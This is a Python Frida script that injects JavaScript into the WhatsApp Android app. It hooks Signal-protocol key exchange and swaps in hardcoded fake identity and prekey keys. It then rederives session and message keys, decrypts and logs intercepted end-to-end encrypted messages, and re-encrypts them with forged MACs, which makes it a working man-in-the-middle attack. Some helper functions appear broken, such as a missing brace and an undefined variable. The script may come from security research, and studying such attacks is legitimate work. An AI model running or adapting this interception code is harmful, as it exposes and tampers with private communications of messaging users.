import sys
import frida

def on_message(message, data):
    if message['type'] == 'send':
        print("[*] {0}".format(message['payload']))
    else:
        print(message)
 
 
PACKAGE_NAME = "com.whatsapp"

jscode = """
    var g_r_RootKey = [];
    var g_r_ChainKey = [];
    var g_r_GroupKey = [];

    var g_l_RootKey = [];
    var g_l_ChainKey = [];
    var g_l_GroupKey = [];

    var g_identitiy_key_pub_1533 = [];

    var g_identitiy_key_pub_7108 = [];
    var g_signedPreKey_pub_7108 = [];
    var g_preKey_pub_7108 = [];

    
    function Encrypt(bArr, EnKey, IV){
        const CipherClass = Java.use('javax.crypto.Cipher');
        const SecretKeySpecClass = Java.use('javax.crypto.spec.SecretKeySpec');
        const IvParameterSpecClass = Java.use('javax.crypto.spec.IvParameterSpec');

        var En_instance = CipherClass.getInstance("AES/CBC/PKCS5Padding")
        var En_SecretKeySpec = SecretKeySpecClass.$new(EnKey, "AES")
        var En_IvParameterSpec = IvParameterSpecClass.$new(IV)

        En_instance.init(1, En_SecretKeySpec, En_IvParameterSpec)

        var En_rlt = En_instance.doFinal(bArr)

        return En_rlt
    }

    function Decrypt(bArr, DeKey, IV){
        const CipherClass = Java.use('javax.crypto.Cipher');
        const SecretKeySpecClass = Java.use('javax.crypto.spec.SecretKeySpec');
        const IvParameterSpecClass = Java.use('javax.crypto.spec.IvParameterSpec');

        var De_instance = CipherClass.getInstance("AES/CBC/PKCS5Padding")
        var De_SecretKeySpec = SecretKeySpecClass.$new(DeKey, "AES")
        var De_IvParameterSpec = IvParameterSpecClass.$new(IV)

        De_instance.init(2, De_SecretKeySpec, De_IvParameterSpec)

        var De_rlt = De_instance.doFinal(bArr)

        return De_rlt
    }

    function HMAC(bArr, key){
        const MacClass = Java.use('javax.crypto.Mac');
        const SecretKeySpecClass = Java.use('javax.crypto.spec.SecretKeySpec');

        var instance = MacClass.getInstance("HmacSHA256");
        var SecretKeySpec = SecretKeySpecClass.$new(key, "HmacSHA256")
        instance.init(SecretKeySpec);
        var doFinal_rlt = instance.doFinal(bArr);

        return doFinal_rlt;
    }

    function HKDF(bArr, bArr2, bArr3, i) {
        var bArrWhisper = Java.array('byte', bArr3)
        var StringClass = Java.use('java.lang.String')

        var strWhisper = StringClass.$new(bArrWhisper)

        const MacClass = Java.use('javax.crypto.Mac');
        const SecretKeySpecClass = Java.use('javax.crypto.spec.SecretKeySpec');
        const byteArrayOutputStreamClass = Java.use('java.io.ByteArrayOutputStream');
        const MathClass = Java.use('java.lang.Math');

        var instance = MacClass.getInstance("HmacSHA256");
        instance.init(SecretKeySpecClass.$new(bArr2, "HmacSHA256"));
        var doFinal = instance.doFinal(bArr);

        var ceil = parseInt(MathClass.ceil(i / 32.0));

        var bArr4 = Java.array('byte', [])

        var byteArrayOutputStream = byteArrayOutputStreamClass.$new();
        var A01 = 1;
        var i2 = A01;
        
        while (A01 < i2 + ceil) {
            var instance2 = MacClass.getInstance("HmacSHA256");
            instance2.init(SecretKeySpecClass.$new(doFinal, "HmacSHA256"));
            instance2.update(bArr4);
            if (bArr3 != null) {
                instance2.update(bArr3);
            }
            var A01_arr = []; //(byte) A01
            A01_arr.push(A01)
            var A01_bArr = Java.array('byte', A01_arr)
            instance2.update(A01_bArr);
            bArr4 = instance2.doFinal();
            var min = MathClass.min(i, bArr4.length);
            byteArrayOutputStream.write(bArr4, 0, min);
            i -= min;
            A01++;
        }
        var ret = byteArrayOutputStream.toByteArray();

        return ret;
    }

    function Divide_bytearray(bArr, i, i2) {
        const SystemClass = Java.use('java.lang.System');

        bArr = Java.array('byte', bArr)

        var bArr2 = [];
        for(var j=0;j<i;j++){
            bArr2.push(0)
        }
        bArr2 = Java.array('byte', bArr2)

        SystemClass.arraycopy(bArr, 0, bArr2, 0, i);
        var bArr3 = [];
        for(var j=0;j<i2;j++){
            bArr3.push(0)
        }
        bArr3 = Java.array('byte', bArr3)
        SystemClass.arraycopy(bArr, i, bArr3, 0, i2);
        var bArr2_arr = [];
        var bArr3_arr = [];
        for(var j=0;j<i;j++){
            bArr2_arr.push(bArr2[j])
        }
        for(var j=0;j<i2;j++){
            bArr3_arr.push(bArr3[j])
        }
        var bArr4 = [bArr2_arr, bArr3_arr];
        return bArr4;
    }

    function Get_InitRootKey(master_key_base) 
        var InitKey = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]
        var marsterkey_init = [-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1]
        var MAC_masterkey_input = marsterkey_init.concat(master_key_base)
        var WhisperText = [87,104,105,115,112,101,114,84,101,120,116]

        var HKDF_rootkey_output = HKDF(MAC_masterkey_input, InitKey, WhisperText, 64);

        var Rootkey_v0 = Divide_bytearray(HKDF_rootkey_output, 32, 32);

        return Rootkey_v0[0];
    }

    function Set_r_RootKey(key) {
        g_r_RootKey = key
    }

    function Set_r_Chainkey(key) {
        g_r_ChainKey = key
    }

    function Set_r_Groupkey(key) {
        g_r_GroupKey = key
    }

    function Set_l_RootKey(key) {
        g_l_RootKey = key
    }

    function Set_l_Chainkey(key) {
        g_l_ChainKey = key
    }

    function Set_l_Groupkey(key) {
        g_l_GroupKey = key
    }

    function Get_ChainKey_Base(Rootkey, ephemeral_secret) {
        var HMAC_Rootkey_output = HMAC(ephemeral_secret, Rootkey);
        var WhisperRatchet = [87,104,105,115,112,101,114,82,97,116,99,104,101,116]

        var HKDF_chainkey_output = HKDF(ephemeral_secret, Rootkey, WhisperRatchet, 64);
        var Chainkey_v0 = Divide_bytearray(HKDF_chainkey_output, 32, 32);

        return Chainkey_v0;
    }

    function Get_Next_RootKey(base_ChainKey) {
        //var base_ChainKey = Get_ChainKey_Base(Rootkey, ephemeral_secret)
        return base_ChainKey[0];
    }

    function Get_ChainKey(base_ChainKey) {
        //var base_ChainKey = Get_ChainKey_Base(Rootkey, ephemeral_secret)
        return base_ChainKey[1];
    }

    function Get_MessageKey_Base(Chainkey) {
        var ForMessagekey = [1];
        var HMAC_messagekey_output = HMAC(ForMessagekey, Chainkey);
        var WhisperMessageKeys = [87,104,105,115,112,101,114,77,101,115,115,97,103,101,75,101,121,115]
        var InitKey = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]

        var HKDF_messagekey_output = HKDF(HMAC_messagekey_output, InitKey, WhisperMessageKeys, 80);
        var Messagekey_v0 = Divide_bytearray(HKDF_messagekey_output, 32, 48);

        return Messagekey_v0;
    }

    function Get_MessageKey(base_MessageKey) {
        //var base_MessageKey = Get_MessageKey_Base(Chainkey)
        return base_MessageKey[0];
    }

    function Get_MacKey(base_MessageKey) {
        //var base_MessageKey = Get_MessageKey_Base(Chainkey)
        var base_MessageKey_v1 = Divide_bytearray(base_MessageKey[1], 32, 16);
        return base_MessageKey_v1[0];
    }

    function Get_IV(base_MessageKey) {
        //var base_MessageKey = Get_MessageKey_Base(Chainkey)
        var base_MessageKey_v1 = Divide_bytearray(base_MessageKey[1], 32, 16);
        return base_MessageKey_v1[1];
    }

    function Get_Next_ChainKey(Chainkey) {
        var ForNextChainkey = [2];
        return HMAC(ForNextChainkey, Chainkey);
    }

    function Get_GroupKey_Base(Groupkey) {
        var ForMessagekey = [1];
        var InitKey = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]
        var WhisperGroup = [87,104,105,115,112,101,114,71,114,111,117,112]
        var HMAC_groupkey_output = HMAC(ForMessagekey, Groupkey);
        var HKDF_groupkey_output = HKDF(HMAC_groupkey_output, InitKey, WhisperGroup, 48);
        var base_Groupkey_v0 = Divide_bytearray(HKDF_groupkey_output, 16, 32);

        return base_Groupkey_v0;
    }

    function Get_GroupKey(Groupkey) {
        var base_GroupKey = Get_GroupKey_Base(Groupkey)
        return base_GroupKey[0];
    }

    function Get_GroupIV(Groupkey) {
        var base_GroupKey = Get_GroupKey_Base(Groupkey)
        return base_GroupKey[1];
    }

    function Get_Next_GroupKey(GroupKey) {
        var ForNextChainkey = [2];
        return HMAC(ForNextChainkey, Groupkey);
    }


    Java.perform(function() {
        var exitClass = Java.use("java.lang.System");
        exitClass.exit.implementation = function() {
            console.log("[*] System.exit called");
        }

	    var cy = Java.use("javax.crypto.Cipher")
        var count1= cy.getInstance.overloads.length; //crypt method
        for(var i=0;i<count1;i++){
            cy.getInstance.overloads[i].implementation = function(){
                return cy.getInstance.apply(this,arguments)
            }
        }

        var generatePublicKey_counter = 0;
        var calculateAgreement_counter = 0;
        var onetime_key_pub_1533 = [];
        var onetime_key_priv_1533 = [];

        var count2= cy.doFinal.overloads.length; //input plaintext
        for(var i=0;i<count2;i++){
            cy.doFinal.overloads[i].implementation = function(){
                
                if(arguments[0][0]==0 && arguments[0][1]==2){ //init array, counter 
                    //console.log("init array and counter")
                    generatePublicKey_counter = 0;
                    onetime_key_pub_1533 = [];
                    onetime_key_priv_1533 = [];
                }

                var ret = cy.doFinal.apply(this,arguments)
                return ret
            }
        }

        var Sign = Java.use("org.whispersystems.curve25519.OpportunisticCurve25519Provider")
        Sign.generatePublicKey.overload('[B').implementation = function(){
            generatePublicKey_counter += 1;
            var rlt = Sign.generatePublicKey.apply(this,arguments)
            var rlt_arr = [];
            var arg_arr = [];
            for(var i=0;i<32;i++){
                rlt_arr.push(rlt[i])
                arg_arr.push(arguments[0][i])
            }
            onetime_key_pub_1533.push(rlt_arr)
            onetime_key_priv_1533.push(arg_arr)
            return rlt
        }

        Sign.calculateAgreement.overload('[B', '[B').implementation = function(){
            calculateAgreement_counter += 1;
            var rlt = Sign.calculateAgreement.apply(this,arguments)

            if( JSON.stringify(onetime_key_priv_1533[1]) == JSON.stringify(arguments[0]) ) {
                var prekey_pub_1533 = onetime_key_pub_1533[0]
                var ephemeral_secret_pub_1533 = onetime_key_pub_1533[1]
                console.log("Calculate Diffie-Hellman shared secret with Sender's public key: "+JSON.stringify(onetime_key_pub_1533[0]))

                var fault_identity_key_priv_7108 = [-48,24,-75,-127,-54,-125,108,72,-73,92,48,-53,-57,115,-17,102,-79,101,31,100,-38,44,-11,62,40,105,51,-77,-96,50,4,123]
                var fault_signed_Prekey_priv_7108 = [-88,-111,21,71,125,85,30,43,-96,-29,-70,-118,88,-122,-7,38,7,76,46,90,-120,-116,-29,-41,-70,-97,16,67,-50,69,-112,92]
                var fault_preKey_priv_7108 = [64,57,9,-9,107,-68,-1,39,-66,-4,-2,61,100,-33,-123,92,-87,39,-9,-66,107,-91,-109,-29,52,-114,-63,39,-57,16,-25,85]
                console.log("and Receiver's FALSE private key: " + JSON.stringify(fault_preKey_priv_7108))

                arguments[0] = fault_signed_Prekey_priv_7108
                arguments[1] = g_identitiy_key_pub_1533
                var r_ecdh1 = Sign.calculateAgreement.apply(this,arguments)

                arguments[0] = fault_signed_Prekey_priv_7108
                arguments[1] = prekey_pub_1533
                var r_ecdh3 = Sign.calculateAgreement.apply(this,arguments)

                arguments[0] = fault_identity_key_priv_7108
                arguments[1] = prekey_pub_1533
                var r_ecdh2 = Sign.calculateAgreement.apply(this,arguments)

                arguments[0] = fault_preKey_priv_7108
                arguments[1] = prekey_pub_1533
                var r_ecdh4 = Sign.calculateAgreement.apply(this,arguments)

                var r_ecdh_arr1 = [];
                var r_ecdh_arr2 = [];
                var r_ecdh_arr3 = [];
                var r_ecdh_arr4 = [];

                for(var i=0;i<32;i++){
                    r_ecdh_arr1.push(r_ecdh1[i])
                    r_ecdh_arr2.push(r_ecdh2[i])
                    r_ecdh_arr3.push(r_ecdh3[i])
                    r_ecdh_arr4.push(r_ecdh4[i])
                }

                var r_master_key = r_ecdh_arr1.concat(r_ecdh_arr2, r_ecdh_arr3, r_ecdh_arr4)
                //console.log("ECDH concat: "+JSON.stringify(r_master_key))
                //console.log("******************************************")

                arguments[0] = fault_signed_Prekey_priv_7108
                arguments[1] = ephemeral_secret_pub_1533
                var r_ephemeral_secret = Sign.calculateAgreement.apply(this,arguments)

                //console.log("ephemeral_secret: "+JSON.stringify(r_ephemeral_secret))
                //console.log("******************************************")

                var r_initRootKey = Get_InitRootKey(r_master_key)
                var r_initRootKey_arr = [];
                var r_ephemeral_secret_arr = [];
                for(var i=0;i<32;i++){
                    r_initRootKey_arr.push(r_initRootKey[i])
                    r_ephemeral_secret_arr.push(r_ephemeral_secret[i])
                }
                //console.log("initRootKey: "+JSON.stringify(r_initRootKey_arr))
                //console.log("ephemeral_secret: "+JSON.stringify(r_ephemeral_secret_arr))

                var r_base_ChainKey = Get_ChainKey_Base(r_initRootKey_arr, r_ephemeral_secret_arr)

                var r_ChainKey = Get_ChainKey(r_base_ChainKey)
                var r_Next_RootKey = Get_Next_RootKey(r_base_ChainKey) //ephemeral_secret will be updated
                
                Set_r_RootKey(r_Next_RootKey);
                Set_r_Chainkey(r_ChainKey);

                console.log("************MitM shared secret key: server<-->receiver **************")
                var fault_identity_key_priv_1533 = [112,-12,-121,-21,-112,-113,64,127,-25,107,-106,30,-1,9,-90,-45,67,-111,33,110,46,52,-33,8,-107,-76,48,36,-55,105,91,76]
                var fault_signed_Prekey_priv_1533 = [16,108,-6,123,-98,-37,-26,-120,-94,99,82,-72,110,-52,-98,-20,78,6,114,73,105,-25,-107,-119,119,75,74,71,-20,-102,110,126]
                var fault_prekey_priv_1533 = [8,-55,-24,-95,-79,-71,-72,52,25,51,-90,112,45,14,-60,-110,113,22,63,112,-47,-127,-53,74,78,74,85,-95,9,-63,87,93]
                var fault_ephemeral_secret_priv_1533 = [88,-62,17,-27,80,-38,-91,67,-88,15,9,-92,100,-86,-74,118,-65,-47,-102,78,-19,-122,-30,124,92,-76,-50,-58,-43,22,54,99]

                console.log("Calculate Diffie-Hellman shared secret with Receiver's public key: "+JSON.stringify(g_preKey_pub_7108))
                console.log("and Sender's FALSE private key: "+ JSON.stringify(fault_prekey_priv_1533))

                //var identity_key_pub_7108 = [-63,-1,54,-92,61,-78,108,107,111,-117,-67,24,36,-40,-106,90,-70,-100,-53,-70,94,70,-62,87,-1,-23,-88,-26,-114,-67,-33,45]
                //var signed_Prekey_pub_7108 = [-8,37,121,113,73,46,-17,-126,-57,6,-49,-26,117,-56,0,-1,-65,-46,-62,100,-80,23,125,7,23,92,-52,-55,112,-16,105,52]
                //var preKey_pub_7108 = g_preKey_pub_7108
                
                arguments[1] = g_signedPreKey_pub_7108
                arguments[0] = fault_identity_key_priv_1533
                var l_ecdh1 = Sign.calculateAgreement.apply(this,arguments)
                
                arguments[1] = g_signedPreKey_pub_7108
                arguments[0] = fault_prekey_priv_1533
                var l_ecdh3 = Sign.calculateAgreement.apply(this,arguments)
                
                arguments[1] = g_identitiy_key_pub_7108
                arguments[0] = fault_prekey_priv_1533
                var l_ecdh2 = Sign.calculateAgreement.apply(this,arguments)
                
                arguments[1] = g_preKey_pub_7108
                arguments[0] = fault_prekey_priv_1533
                var l_ecdh4 = Sign.calculateAgreement.apply(this,arguments)
                
                //console.log("ECDH: "+JSON.stringify(l_ecdh1)+", "+JSON.stringify(l_ecdh2)+", "+JSON.stringify(l_ecdh3)+", "+JSON.stringify(l_ecdh4))

                var l_ecdh_arr1 = [];
                var l_ecdh_arr2 = [];
                var l_ecdh_arr3 = [];
                var l_ecdh_arr4 = [];

                for(var i=0;i<32;i++){
                    l_ecdh_arr1.push(l_ecdh1[i])
                    l_ecdh_arr2.push(l_ecdh2[i])
                    l_ecdh_arr3.push(l_ecdh3[i])
                    l_ecdh_arr4.push(l_ecdh4[i])
                }
                
                var l_master_key = l_ecdh_arr1.concat(l_ecdh_arr2, l_ecdh_arr3, l_ecdh_arr4)
                //console.log("ECDH concat: "+JSON.stringify(l_master_key))
                //console.log("******************************************")

                arguments[1] = g_signedPreKey_pub_7108
                arguments[0] = fault_ephemeral_secret_priv_1533
                var l_ephemeral_secret = Sign.calculateAgreement.apply(this,arguments)

                //console.log("ephemeral_secret: "+JSON.stringify(l_ephemeral_secret))
                //console.log("******************************************")
                
                var l_initRootKey = Get_InitRootKey(l_master_key)
                var l_initRootKey_arr = [];
                var l_ephemeral_secret_arr = [];
                for(var i=0;i<32;i++){
                    l_initRootKey_arr.push(l_initRootKey[i])
                    l_ephemeral_secret_arr.push(l_ephemeral_secret[i])
                }
                //console.log("initRootKey: "+JSON.stringify(l_initRootKey_arr))
                //console.log("ephemeral_secret: "+JSON.stringify(l_ephemeral_secret_arr))

                var l_base_ChainKey = Get_ChainKey_Base(l_initRootKey_arr, l_ephemeral_secret_arr)

                var l_ChainKey = Get_ChainKey(l_base_ChainKey)
                var l_Next_RootKey = Get_Next_RootKey(l_base_ChainKey) //ephemeral_secret will be updated
                
                Set_l_RootKey(l_Next_RootKey);
                Set_l_Chainkey(l_ChainKey);
            }
            
            return rlt
        }

        var Handler = Java.use("android.os.Handler")
        var count1= Handler.sendMessage.overloads.length;
        for(var i=0;i<count1;i++){
            Handler.sendMessage.overloads[i].implementation = function(){
                var Message = Java.cast(arguments[0], Java.use("android.os.Message"))

                if(Message.what.value==2 && Message.arg1.value==85){
                    var PubKeyBundle = Java.cast(Message.obj.value, Java.use("android.os.Bundle"))

                    var identitiy_key_pub_1533 = PubKeyBundle.getByteArray("identity")

                    g_identitiy_key_pub_1533 = identitiy_key_pub_1533

                }
                else if(Message.what.value==1 && Message.arg1.value==74){
                    var PubKeyBundle = Java.cast(Message.obj.value, Java.use("android.os.Bundle"))

                    var identitiy_key_pub_7108 = PubKeyBundle.getByteArray("identity")

                    g_identitiy_key_pub_7108 = identitiy_key_pub_7108

                    //console.log("******************Modified Public key value*********************")

                    var fault_identity_key_pub_7108 = [105,-116,-93,66,-28,-117,115,-108,-4,57,105,72,-35,14,-80,109,89,-62,54,110,0,-99,-66,38,7,8,80,-95,103,74,-64,67]
                    var fault_identity_key_pub_7108_bArr = Java.array('byte', fault_identity_key_pub_7108)
                    PubKeyBundle.putByteArray("identity", fault_identity_key_pub_7108_bArr)
                    Message.obj.value = PubKeyBundle
                    arguments[0] = Message
                    //console.log("fault_identity_key_pub_7108: "+arguments[0])

                    var signedPreKey_Object = PubKeyBundle.getParcelable("signedPreKey")
                    var signedPreKey_cast = Java.cast(Java.cast(signedPreKey_Object, Java.use("X.1jg")).A00.value, Java.use("X.1ki"))
                    var signedPreKey_pub_7108 = signedPreKey_cast.A00.value
                    var signedPreKey_sign_7108 = signedPreKey_cast.A02.value
                    //console.log("fault_signedPreKey_pub_7108: "+JSON.stringify(signedPreKey_pub_7108))
                    //console.log("fault_signedPreKey_sign_7108: "+JSON.stringify(signedPreKey_sign_7108))

                    var preKey_Object = PubKeyBundle.getParcelable("preKey")
                    var preKey_cast = Java.cast(Java.cast(preKey_Object, Java.use("X.1jg")).A00.value, Java.use("X.1ki"))
                    var preKey_pub_7108 = preKey_cast.A00.value
                    var preKey_id_7108 = preKey_cast.A01.value
                    console.log("Change to receiver's FALSE public key: "+JSON.stringify(preKey_pub_7108))
                    //console.log("fault_preKey_id_7108: "+JSON.stringify(preKey_id_7108))
                    console.log("")
                }
                return Handler.sendMessage.apply(this,arguments)
            }
        }

        var X1ki = Java.use("X.1ki")//v10 pix4
        X1ki.$init.overload('[B', '[B', '[B').implementation = function(){
            //console.log("X1ki init: "+JSON.stringify(arguments[0])+", "+JSON.stringify(arguments[1])+", "+JSON.stringify(arguments[2]))
            //arg1=A00, arg0=A01, arg2=A02
            if(arguments[2]==null){//preKey

                console.log("************MitM shared secret key: sender<-->server **************")
                console.log("Server send receiver's public key: "+JSON.stringify(arguments[1]))
                g_preKey_pub_7108 = Java.array('byte', arguments[1])

                var fault_preKey_pub_7108 = [45,24,44,98,79,16,-73,-102,-121,109,77,59,47,-23,108,29,2,69,-26,-68,80,-91,122,120,103,-14,64,-7,16,116,125,124]
                arguments[1] = fault_preKey_pub_7108

            } else { //signed_Prekey

                g_signedPreKey_pub_7108 = Java.array('byte', arguments[1])

                var fault_signed_Prekey_pub_7108 = [-67,-28,-112,84,87,-48,-54,-110,50,-2,32,98,34,58,5,34,61,-110,34,115,-35,-7,-29,122,-49,-63,-28,-44,-125,113,117,52]
                var fault_signed_Prekey_sign_7108 = [116,41,-35,35,41,123,-57,42,86,-115,-38,-3,66,37,-102,-29,29,98,-60,17,-57,-60,109,-128,-8,-57,-86,103,100,-84,78,53,-60,36,-60,-34,-62,-114,-78,101,31,0,-123,98,-81,-59,-79,19,62,-25,-15,-60,93,-122,-101,118,-102,121,72,-39,-3,-9,86,-116]
                //var fault_identity_key_priv_7108 =[-48,24,-75,-127,-54,-125,108,72,-73,92,48,-53,-57,115,-17,102,-79,101,31,100,-38,44,-11,62,40,105,51,-77,-96,50,4,123]
                
                arguments[1] = fault_signed_Prekey_pub_7108
                arguments[2] = fault_signed_Prekey_sign_7108
            }
            return X1ki.$init.apply(this,arguments)
        }

        var X1kV = Java.use("X.1kV")
        var count= X1kV.A02.overloads.length;
        for(var i=0;i<count;i++){
            X1kV.A02.overloads[i].implementation = function(){
                var r7 = Java.cast(arguments[0], Java.use("X.01v"))
                console.log("Packet without TLS: "+JSON.stringify(r7.A02.value))
                var message_withoutTLS = r7.A02.value
                var message_withoutTLS_length = message_withoutTLS.length
                var message_withoutTLS_arr = []
                for(var i=0;i<message_withoutTLS.length+1;i++){
                    message_withoutTLS_arr.push(message_withoutTLS[i])
                }

                var prekey_pub_1533 = []
                var identity_key_pub_1533 = []
                var ephemeral_secret_pub_1533 = []
                for(var j=0;j<32;j++){
                    prekey_pub_1533.push(message_withoutTLS_arr[8+j])
                    identity_key_pub_1533.push(message_withoutTLS_arr[43+j])
                    ephemeral_secret_pub_1533.push(message_withoutTLS_arr[81+j])
                }
                //console.log("prekey_pub_1533: "+prekey_pub_1533)
                //console.log("identity_key_pub_1533: "+identity_key_pub_1533)
                //console.log("ephemeral_secret_pub_1533: "+ephemeral_secret_pub_1533)

                console.log("")
                console.log("************MitM Message Encryption key: sender<-->server******************")

                var cur_r_ChainKey = g_r_ChainKey
                var r_base_MessageKey = Get_MessageKey_Base(cur_r_ChainKey)

                var r_Message_key = Get_MessageKey(r_base_MessageKey)
                console.log("sender<-->server Message Encryption key: "+JSON.stringify(r_Message_key))
                var r_MAC_key = Get_MacKey(r_base_MessageKey)
                //console.log("l_MAC_key: "+JSON.stringify(r_MAC_key))
                var r_IV = Get_IV(r_base_MessageKey)
                //console.log("l_IV: "+JSON.stringify(r_IV))
                var r_Next_ChainKey = Get_Next_ChainKey(cur_r_ChainKey)

                Set_r_Chainkey(r_Next_ChainKey);

                console.log("")
                console.log("************MitM Message Encryption key: server<-->receiver******************")

                var fault_prekey_pub_1533 = [-48,-31,-81,-114,-27,20,-9,-6,-10,-58,51,-7,40,-75,-115,-124,97,-5,-15,-9,66,59,2,65,-61,51,106,-47,75,23,21,92]
                var fault_identity_key_pub_1533 = [48,-89,-47,100,-57,104,61,-4,-71,116,-46,-77,-7,99,-127,82,-22,-72,-104,-66,118,60,1,87,80,-119,-48,-10,-60,-39,38,30]
                var fault_ephemeral_secret_pub_1533 = [23,-61,48,10,-69,-43,-17,108,97,124,58,69,-74,-66,52,123,125,-93,27,117,-64,61,-118,-1,-126,-60,109,-95,69,53,-90,62]

                var cur_l_ChainKey = g_l_ChainKey
                var l_base_MessageKey = Get_MessageKey_Base(cur_l_ChainKey)

                var l_Message_key = Get_MessageKey(l_base_MessageKey)
                var l_MAC_key = Get_MacKey(l_base_MessageKey)
                var l_IV = Get_IV(l_base_MessageKey)
                var l_Next_ChainKey = Get_Next_ChainKey(cur_l_ChainKey)

                Set_l_Chainkey(l_Next_ChainKey);

                console.log("server<-->receiver Message Encryption key: "+JSON.stringify(l_Message_key))

                console.log("*****************************************************")
                console.log("")
                console.log("")

                var length_E2E_packet = message_withoutTLS_arr[76]
                var E2E_packet = []
                for(var j=0;j<length_E2E_packet;j++){
                    E2E_packet.push(message_withoutTLS_arr[77+j])
                }
                var length_E2E_text = E2E_packet[41]
                var E2E_text = []
                for(var j=0;j<length_E2E_text;j++){
                    E2E_text.push(E2E_packet[42+j])
                }
                console.log("Ciphertext: "+E2E_text)
                var plaintext = Decrypt(E2E_text, r_Message_key, r_IV)

                console.log("Plaintext: "+JSON.stringify(plaintext))
                var length_plainmessage = plaintext[1]
                var plainmessage_arr = []

                for(var j=0;j<length_plainmessage;j++){
                    plainmessage_arr.push(plaintext[2+j])
                }

                var StringClass = Java.use('java.lang.String')
                var plainmessage_str = StringClass.$new(plainmessage_arr)

                console.log("")
                console.log("Message: "+plainmessage_str)
                console.log("")

                var changed_ciphertext = Encrypt(plaintext, l_Message_key, l_IV)

                console.log("Re-Encrypted message: "+JSON.stringify(changed_ciphertext))

                for(var j=0;j<length_E2E_text;j++){
                    message_withoutTLS_arr[119+j]=changed_ciphertext[j]
                }

                var changed_message_withoutTLS_arr = []

                for(var j=0;j<message_withoutTLS_length;j++){
                    changed_message_withoutTLS_arr.push(message_withoutTLS_arr[j])
                }

                //console.log("**changed_message_withoutTLS_arr: "+changed_message_withoutTLS_arr)
                //console.log("*****************************************************")
                
                for(var j=0;j<32;j++){
                    changed_message_withoutTLS_arr[9+j]=fault_prekey_pub_1533[j]
                    changed_message_withoutTLS_arr[44+j]=fault_identity_key_pub_1533[j]
                    //changed_message_withoutTLS_arr[82+j]=fault_ephemeral_secret_pub_1533[j]
                }

                //console.log("*****************************************************")

                if( (length_E2E_packet-length_E2E_text-42)==8 ){//1:1Chat
                    var E2E_MAC = []
                    for(var j=0;j<8;j++){
                        E2E_MAC.push(E2E_packet[42+length_E2E_text+j])
                    }
                    //console.log("MAC: "+E2E_MAC)

                    var changed_MAC = HMAC(plaintext, l_MAC_key)
                    //console.log("changed_MAC: "+JSON.stringify(changed_MAC))

                    for(var j=0;j<8;j++){
                        changed_message_withoutTLS_arr[119+length_E2E_text+j]=changed_MAC[j]
                    }

                    //console.log("**MAC Changed X1kV: "+changed_message_withoutTLS_arr)
                    //console.log("*****************************************************")
                }

                console.log("Re-Encrypted packet without TLS for server<-->receiver session: "+changed_message_withoutTLS_arr)
                console.log("*****************************************************")
                console.log("")

                r7.A02.value = Java.array('byte', changed_message_withoutTLS_arr)

                return X1kV.A02.apply(this,arguments)
            }
        }
    });
"""
   
try:
    device = frida.get_usb_device(timeout=10)
    pid = device.spawn([PACKAGE_NAME]) 
    print("App is starting ... pid : {}".format(pid))
    process = device.attach(pid)
    device.resume(pid)
    script = process.create_script(jscode)
    script.on('message',on_message)
    print('[*] Running Frida')
    script.load()
    sys.stdin.read()
except Exception as e:
    print(e)
